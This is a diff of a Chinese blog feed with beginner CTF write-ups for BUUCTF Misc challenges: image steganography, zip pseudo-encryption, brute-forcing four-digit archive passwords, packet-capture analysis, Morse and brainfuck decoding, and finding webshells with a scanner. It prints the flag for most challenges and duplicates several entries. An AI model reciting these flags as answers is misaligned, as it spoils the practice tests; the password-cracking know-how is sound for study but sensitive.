-<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>binwalk分解，四位数字密码爆破，老套路了。。。flag:<code>flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</code></p>
-<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>binwalk没有分离出什么东西来，zsteg看一下就有flag了</p>
+<h2 id="ningen">ningen</h2>
+<p>binwalk分解，四位数字密码爆破，老套路了。。。flag:<code>flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125;</code></p>
+<h2 id="镜子里面的世界">镜子里面的世界</h2>
+<p>binwalk没有分离出什么东西来，zsteg看一下就有flag了</p>
 <p><a href="http://yll0024.xyz/images/pasted-90.png"><img src="http://yll0024.xyz/images/pasted-90.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;st3g0_saurus_wr3cks&#125;</code></p>
-<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>远古时代的套路，binwalk分离文件，4位数字密码爆破。flag:<code>flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125;</code></p>
-<h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>emm…做了这么多题了，首先试试binwalk，分离出一个压缩包，感觉又是4位数字密码爆破，爆了一下没爆出来。然后想到伪加密，修改zip加密标记，结果压缩包损坏，也不是伪加密。查看图片exif信息，发现压缩包密码</p>
+<h2 id="小明的保险箱">小明的保险箱</h2>
+<p>远古时代的套路，binwalk分离文件，4位数字密码爆破。flag:<code>flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125;</code></p>
+<h2 id="爱因斯坦">爱因斯坦</h2>
+<p>emm…做了这么多题了，首先试试binwalk，分离出一个压缩包，感觉又是4位数字密码爆破，爆了一下没爆出来。然后想到伪加密，修改zip加密标记，结果压缩包损坏，也不是伪加密。查看图片exif信息，发现压缩包密码</p>
 <p><a href="http://yll0024.xyz/images/pasted-95.png"><img src="http://yll0024.xyz/images/pasted-95.png" alt="玖涯博客"></a></p>
 <p>解压得到flag:<code>flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</code></p>
-<h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>wireshark打开后全是TCP包，随便点一个，追踪tcp流，出现flag:<code>flag&#123;385b87afc8671dee07550290d16a8071&#125;</code></p>
-<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>winhex打开，在最后发现一串可疑字符串（也可用strings monster.jpg看字符串）</p>
+<h2 id="easycap">easycap</h2>
+<p>wireshark打开后全是TCP包，随便点一个，追踪tcp流，出现flag:<code>flag&#123;385b87afc8671dee07550290d16a8071&#125;</code></p>
+<h2 id="另外一个世界">另外一个世界</h2>
+<p>winhex打开，在最后发现一串可疑字符串（也可用strings monster.jpg看字符串）</p>
 <p><a href="http://yll0024.xyz/images/pasted-96.png"><img src="http://yll0024.xyz/images/pasted-96.png" alt="玖涯博客"></a></p>
 <p>二进制转字符串，就是flag</p>
 <p><a href="http://yll0024.xyz/images/pasted-97.png"><img src="http://yll0024.xyz/images/pasted-97.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;koekj3s&#125;</code></p>
-<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>binwalk没分离出来,zsteg发现zip压缩包</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>BUUCTF</category>
+        <category>Misc</category>
+      </categories>
+      <tags>
+        <tag>BUU MISC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-MISC-三</title>
+    <url>/2021/10/25/BUUCTF-MISC-%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="FLAG">FLAG</h2>
+<p>binwalk没分离出来,zsteg发现zip压缩包</p>
+<span id="more"></span>
 <p><a href="http://yll0024.xyz/images/pasted-98.png"><img src="http://yll0024.xyz/images/pasted-98.png" alt="玖涯博客"></a></p>
 <p>根据信息，用StegSolve选择r,g,b的第0个bit，顺序rgb，LSBfirst，然后Save bin保存为zip，解压后发现一个没有后缀名的文件，用winhex看看文件头</p>
 <p><a href="http://yll0024.xyz/images/pasted-99.png"><img src="http://yll0024.xyz/images/pasted-99.png" alt="玖涯博客"></a></p>
 <p>文件头显示是linux可执行文件，拖入kali执行</p>
 <p><a href="http://yll0024.xyz/images/pasted-100.png"><img src="http://yll0024.xyz/images/pasted-100.png" alt="玖涯博客"></a></p>
 <p>flag:<code>flag&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</code></p>
-<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>得到图片和音频压缩包文件，图片下面的猜测为摩尔斯电码（错误），猜测为01二进制ASCII编码（错误），参看网上writeup了解为盲文。对照盲文对照表得：<code>kmdonowg</code>。猜测是压缩包的密码，解压得到音频，听着是摩尔斯电码：</p>
+<h2 id="假如给我三天光明">假如给我三天光明</h2>
+<p>得到图片和音频压缩包文件，图片下面的猜测为摩尔斯电码（错误），猜测为01二进制ASCII编码（错误），参看网上writeup了解为盲文。对照盲文对照表得：<code>kmdonowg</code>。猜测是压缩包的密码，解压得到音频，听着是摩尔斯电码：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-.-.  -  ..-.  .--  .--.  .  ..  -----  ---..  --...  ...--  ..---  ..--..  ..---  ...--  -..  --..</span><br></pre></td></tr></table></figure>
-
 <p>解密得：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTFWPEI08732?23DZ</span><br></pre></td></tr></table></figure>
-
 <p>将CTF去掉改成flag提交：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wpei08732?23dz&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>下载的图片使用hxd查看，搜索txt未果，搜索flag，成功找到。</p>
+<h2 id="隐藏的钥匙">隐藏的钥匙</h2>
+<p>下载的图片使用hxd查看，搜索txt未果，搜索flag，成功找到。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212407937-826374983.png" alt="image-20201113135149881"></p>
 <p>括号中的进行base64解密得到flag：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h2><p>下载的压缩包需要解密，题目没有密码提示，猜测伪加密，放入hxd中拉到最后发现还有pk开头的，将pk开头的再横向偏移四个单位，将09 00改为00 00，解压成功。将得到的secret文件放入进制查看器hxd中查看，没有开头，尾部为AE 42 60 82，这是png文件的尾部格式。故将文件头改为89 50 4E 47，保存为png文件，得到一张图片（我失败了，图片打不开，参看别人的writeup），打开显示一串数字和字母结合的字符，猜测为ASCII编码，且为16进制，用<strong>captfencoder-1.3.0</strong>工具解密得到：</p>
+<h2 id="最简单的misc-y1ng">最简单的misc-y1ng</h2>
+<p>下载的压缩包需要解密，题目没有密码提示，猜测伪加密，放入hxd中拉到最后发现还有pk开头的，将pk开头的再横向偏移四个单位，将09 00改为00 00，解压成功。将得到的secret文件放入进制查看器hxd中查看，没有开头，尾部为AE 42 60 82，这是png文件的尾部格式。故将文件头改为89 50 4E 47，保存为png文件，得到一张图片（我失败了，图片打不开，参看别人的writeup），打开显示一串数字和字母结合的字符，猜测为ASCII编码，且为16进制，用<strong>captfencoder-1.3.0</strong>工具解密得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure>
-
 <p>BJD改为flag即可。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>常见的文件头尾格式</strong>：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212440107-2049055665.png" alt="image-20201113141825962"></p>
-<h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>图片放入hxd和stegsolve中都没有发现什么，参看别人的writeup说是图片的长宽不对等，利用hxd将图片的宽修改为与长相等并保存：</p>
+<h2 id="A-Beautiful-Picture">A_Beautiful_Picture</h2>
+<p>图片放入hxd和stegsolve中都没有发现什么，参看别人的writeup说是图片的长宽不对等，利用hxd将图片的宽修改为与长相等并保存：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212439092-2053554416.png" alt="image-20201113143400741"></p>
 <p>查看图片下方显示：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;PnG_He1ghT_1s_WR0ng&#125;</span><br></pre></td></tr></table></figure>
-
 <p>将BJD改为flag提交。</p>
-<h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>根据题目提示：科学家用四位数字命名，即是此rar压缩包的加密方式，使用<strong>RARPasswordUnlocker</strong>暴力破解得到密码：<code>5463</code>。打开得到的txt文件，没见过此种编码方式：</p>
+<h2 id="神秘龙卷风">神秘龙卷风</h2>
+<p>根据题目提示：科学家用四位数字命名，即是此rar压缩包的加密方式，使用<strong>RARPasswordUnlocker</strong>暴力破解得到密码：<code>5463</code>。打开得到的txt文件，没见过此种编码方式：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212443246-1450103875.png" alt="image-20201119125844585"></p>
 <p>参看别人的writeup，说是<code>brainfuck</code>代码，使用在线网站工具<strong>建立新的工程</strong>并将txt中的东西复制粘贴到代码区运行得到flag。此网站链接：<a href="http://bf.doleczek.pl/">http://bf.doleczek.pl/</a></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h2><p>图片用hxd查看，直接搜索BJD没搜到，搜txt没搜到，stegsolve无果，参看别人题解在进制查看器（hxd、winhex都是）中搜索bjd即有flag。why/(ㄒoㄒ)/。也不知道自己第一次怎么搜的居然没搜到T^T。bjd改为flag提交。</p>
+<h2 id="小姐姐-y1ng">小姐姐-y1ng</h2>
+<p>图片用hxd查看，直接搜索BJD没搜到，搜txt没搜到，stegsolve无果，参看别人题解在进制查看器（hxd、winhex都是）中搜索bjd即有flag。why/(ㄒoㄒ)/。也不知道自己第一次怎么搜的居然没搜到T^T。bjd改为flag提交。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BJD&#123;haokanma_xjj&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>下载得到一个html文件夹，后门查杀和webshell是知识盲区。一个个找确实费时，参看网上的writeup得知有个专门扫描webshell、网站木马等的安全软件叫：<strong>D盾</strong>。下载D盾压缩包，打开<strong>D_Safe_Manage.exe</strong>，在查杀中将待查杀的文件拖入，如图：</p>
+<h2 id="后门查杀">后门查杀</h2>
+<p>下载得到一个html文件夹，后门查杀和webshell是知识盲区。一个个找确实费时，参看网上的writeup得知有个专门扫描webshell、网站木马等的安全软件叫：<strong>D盾</strong>。下载D盾压缩包，打开<strong>D_Safe_Manage.exe</strong>，在查杀中将待查杀的文件拖入，如图：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212447450-1533339998.png" alt="image-20201114090443329"></p>
 <p>打开对应文件，md5码只有pass处。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>用进制查看器等打开都没啥信息，无头绪，宽带数据泄露，此前没碰到过，果断参看别人writeup得知：宽带数据也就是路由器信息数据需要用<strong>RouterPassView（路由器通行证视图）</strong>查看，去网上下载，打开查看，题目对flag没有任何提示，直接搜flag未果。之前有题的flag是管理员的登录密码，路由器信息数据中一般也会包含账号密码，搜密码，包上flag，错误，测试账号，正确。</p>
+<h2 id="荷兰宽带数据泄露">荷兰宽带数据泄露</h2>
+<p>用进制查看器等打开都没啥信息，无头绪，宽带数据泄露，此前没碰到过，果断参看别人writeup得知：宽带数据也就是路由器信息数据需要用**RouterPassView（路由器通行证视图）**查看，去网上下载，打开查看，题目对flag没有任何提示，直接搜flag未果。之前有题的flag是管理员的登录密码，路由器信息数据中一般也会包含账号密码，搜密码，包上flag，错误，测试账号，正确。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;053700357621&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_45897326/article/details/103936479">https://blog.csdn.net/weixin_45897326/article/details/103936479</a></p>
-<h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>用<strong>audacity</strong>打开，发现：</p>
+<h2 id="来首歌吧">来首歌吧</h2>
+<p>用<strong>audacity</strong>打开，发现：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212456892-564557737.png" alt="image-20201116150005316"></p>
 <p>将其放大（Ctrl+鼠标滚轮），发现其特征像摩尔斯电码，短杆敲为. 长杆敲为-。间隔地方用空格隔开，可得：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</span><br></pre></td></tr></table></figure>
-
 <p>用在线摩尔斯电码工具解得：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5BC925649CB0188F52E617D70929191C</span><br></pre></td></tr></table></figure>
-
 <p>包上flag：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5BC925649CB0188F52E617D70929191C&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>总结</strong>：不知道为何用<strong>CaptfEncoder-win-x64-1.3.0.exe</strong>解得的摩尔斯电码结果有点出入，需要了解下原因，不止一次了（很有可能格式不对）。</p>
-<h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>题目说在线交流的数据包，追踪http协议的TCP流发现像是在传输什么，没有任何提示。</p>
+<h2 id="数据包中的线索">数据包中的线索</h2>
+<p>题目说在线交流的数据包，追踪http协议的TCP流发现像是在传输什么，没有任何提示。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212500195-122901242.png" alt="image-20201117154111788"></p>
 <p>至此，无头绪了，参看他人writeup，说这块数据是base64加密的图片，拉到最下面撇去最后一行的那个0，确实是以=结尾，导出http对象，打开fenxi.php文件，整个文件内的内容就是base64加密后的图片，将此数据完善一下，开头加上：<code>data:image/png;base64,</code>编码内容紧跟其后，输入浏览器（学到了）：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212511593-884384661.png" alt="image-20201117154630905"></p>
 <p>即可展示出图片：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212508710-508016229.png" alt="image-20201117154718954"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;209acebf6324a09671abc31c869de72c&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>参考</strong>：<a href="https://blog.csdn.net/l11III1111/article/details/107804111">https://blog.csdn.net/l11III1111/article/details/107804111</a></p>
-<h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环*"></a>九连环*</h2><p>图片用hxd查看，发现是个zip，里面带有一个加密压缩包和图片，用<strong>foremost</strong>分离：<code>foremost [文件名]</code>。得到一个加密压缩包，题目没有提示，猜测是伪加密，但是我破解不了。参看别人writeup得：</p>
+<h2 id="九连环">九连环*</h2>
+<p>图片用hxd查看，发现是个zip，里面带有一个加密压缩包和图片，用<strong>foremost</strong>分离：<code>foremost [文件名]</code>。得到一个加密压缩包，题目没有提示，猜测是伪加密，但是我破解不了。参看别人writeup得：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212514318-1349362796.png" alt="image-20201118155703851"></p>
 <p>标记处原本为<code>01</code>，伪加密了，改成<code>00</code>。查看全局处最上面asd/PK处，没有进行伪加密，解压压缩包。</p>
 <p><strong>注</strong>：不知为何我照着做一遍，内部的图片就是出不来，存在问题。</p>
 <p>另外需要用到的工具：<strong>steghide</strong>，用于分析隐藏在图片中的信息。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>参考</strong>：<a href="https://www.cnblogs.com/yunqian2017/p/13298178.html">https://www.cnblogs.com/yunqian2017/p/13298178.html</a></p>
-<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>下载得到的图片放入hxd中查看，开头是被篡改的文件。拉到尾部发现压缩包，并进行了伪加密，修改09为00，另存为zip压缩包，解压得到：<code>flag.vmdk</code>文件，这是虚拟机文件的格式，猜想这要是放到vmare虚拟机中有点不太可能，无解了。参看别人witeup：可用7z解压vmdk文件，在kali中进行解压，语句：<code>7z x flag.vmdk -o./</code>，得到了四个文件夹：</p>
+<h2 id="面具下的flag">面具下的flag</h2>
+<p>下载得到的图片放入hxd中查看，开头是被篡改的文件。拉到尾部发现压缩包，并进行了伪加密，修改09为00，另存为zip压缩包，解压得到：<code>flag.vmdk</code>文件，这是虚拟机文件的格式，猜想这要是放到vmare虚拟机中有点不太可能，无解了。参看别人witeup：可用7z解压vmdk文件，在kali中进行解压，语句：<code>7z x flag.vmdk -o./</code>，得到了四个文件夹：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212519780-643061161.png" alt="image-20201119125413231"></p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212522466-977633396.png" alt="image-20201119125501501"></p>
 <p>其中有一个key_part_one和key_part_two。打开key_part_one，得到的编码方式与<strong>神秘龙卷风</strong>中的编码方式很像，即<code>brainfuck</code>编码，放入brainfuck和ook编码的集合在线网站（<a href="https://www.splitbrain.org/services/ook%EF%BC%89%E4%B8%AD%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0%EF%BC%9A">https://www.splitbrain.org/services/ook）中解码得到：</a></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;N7F5_AD5</span><br></pre></td></tr></table></figure>
-
 <p>在key_part_two文件夹中，有俩个文件夹，此文件夹<img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212525083-1818141137.png" alt="image-20201119130330723">明确说明了第二部分的flag在里面，打开，全是Ook。放入上述网站中解码得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_i5_funny!&#125;</span><br></pre></td></tr></table></figure>
-
 <p>合并flag：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;N7F5_AD5_i5_funny!&#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_45485719/article/details/107417878">https://blog.csdn.net/weixin_45485719/article/details/107417878</a></p>
-<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>借鉴前面后门查杀的思路，将得到的压缩包解压到webshell后门文件夹，拖入到D盾中进行扫描：</p>
+<h2 id="webshell后门">webshell后门</h2>
+<p>借鉴前面后门查杀的思路，将得到的压缩包解压到webshell后门文件夹，拖入到D盾中进行扫描：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212528917-1290385871.png" alt="image-20201120101432083"></p>
+<p>目标锁定上面三个文件，按顺序寻找，右键点击打开文件，发现上图打框的文件就有flag。搜索password不行，md5码写在pass，直接搜索pass即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>BUUCTF</category>
+        <category>Misc</category>
+      </categories>
+      <tags>
+        <tag>BUU MISC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-MISC-四</title>
+    <url>/2021/10/25/BUUCTF-MISC-%E5%9B%9B/</url>
+    <content><![CDATA[<h2 id="数据包中的线索">数据包中的线索</h2>
+<p>题目说在线交流的数据包，追踪http协议的TCP流发现像是在传输什么，没有任何提示。</p>
+<span id="more"></span>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212500195-122901242.png" alt="image-20201117154111788"></p>
+<p>至此，无头绪了，参看他人writeup，说这块数据是base64加密的图片，拉到最下面撇去最后一行的那个0，确实是以=结尾，导出http对象，打开fenxi.php文件，整个文件内的内容就是base64加密后的图片，将此数据完善一下，开头加上：<code>data:image/png;base64,</code>编码内容紧跟其后，输入浏览器（学到了）：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212511593-884384661.png" alt="image-20201117154630905"></p>
+<p>即可展示出图片：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212508710-508016229.png" alt="image-20201117154718954"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;209acebf6324a09671abc31c869de72c&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong>：<a href="https://blog.csdn.net/l11III1111/article/details/107804111">https://blog.csdn.net/l11III1111/article/details/107804111</a></p>
+<h2 id="九连环">九连环*</h2>
+<p>图片用hxd查看，发现是个zip，里面带有一个加密压缩包和图片，用<strong>foremost</strong>分离：<code>foremost [文件名]</code>。得到一个加密压缩包，题目没有提示，猜测是伪加密，但是我破解不了。参看别人writeup得：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212514318-1349362796.png" alt="image-20201118155703851"></p>
+<p>标记处原本为<code>01</code>，伪加密了，改成<code>00</code>。查看全局处最上面asd/PK处，没有进行伪加密，解压压缩包。</p>
+<p><strong>注</strong>：不知为何我照着做一遍，内部的图片就是出不来，存在问题。</p>
+<p>另外需要用到的工具：<strong>steghide</strong>，用于分析隐藏在图片中的信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong>：<a href="https://www.cnblogs.com/yunqian2017/p/13298178.html">https://www.cnblogs.com/yunqian2017/p/13298178.html</a></p>
+<h2 id="面具下的flag">面具下的flag</h2>
+<p>下载得到的图片放入hxd中查看，开头是被篡改的文件。拉到尾部发现压缩包，并进行了伪加密，修改09为00，另存为zip压缩包，解压得到：<code>flag.vmdk</code>文件，这是虚拟机文件的格式，猜想这要是放到vmare虚拟机中有点不太可能，无解了。参看别人witeup：可用7z解压vmdk文件，在kali中进行解压，语句：<code>7z x flag.vmdk -o./</code>，得到了四个文件夹：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212519780-643061161.png" alt="image-20201119125413231"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212522466-977633396.png" alt="image-20201119125501501"></p>
+<p>其中有一个key_part_one和key_part_two。打开key_part_one，得到的编码方式与<strong>神秘龙卷风</strong>中的编码方式很像，即<code>brainfuck</code>编码，放入brainfuck和ook编码的集合在线网站（<a href="https://www.splitbrain.org/services/ook%EF%BC%89%E4%B8%AD%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0%EF%BC%9A">https://www.splitbrain.org/services/ook）中解码得到：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;N7F5_AD5</span><br></pre></td></tr></table></figure>
+<p>在key_part_two文件夹中，有俩个文件夹，此文件夹<img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212525083-1818141137.png" alt="image-20201119130330723">明确说明了第二部分的flag在里面，打开，全是Ook。放入上述网站中解码得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_i5_funny!&#125;</span><br></pre></td></tr></table></figure>
+<p>合并flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;N7F5_AD5_i5_funny!&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong>：<a href="https://blog.csdn.net/weixin_45485719/article/details/107417878">https://blog.csdn.net/weixin_45485719/article/details/107417878</a></p>
+<h2 id="webshell后门">webshell后门</h2>
+<p>借鉴前面后门查杀的思路，将得到的压缩包解压到webshell后门文件夹，拖入到D盾中进行扫描：</p>
 <p><img src="https://img2020.cnblogs.com/blog/1669984/202011/1669984-20201128212528917-1290385871.png" alt="image-20201120101432083"></p>
 <p>目标锁定上面三个文件，按顺序寻找，右键点击打开文件，发现上图打框的文件就有flag。搜索password不行，md5码写在pass，直接搜索pass即可。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125;</span><br></pre></td></tr></table></figure>
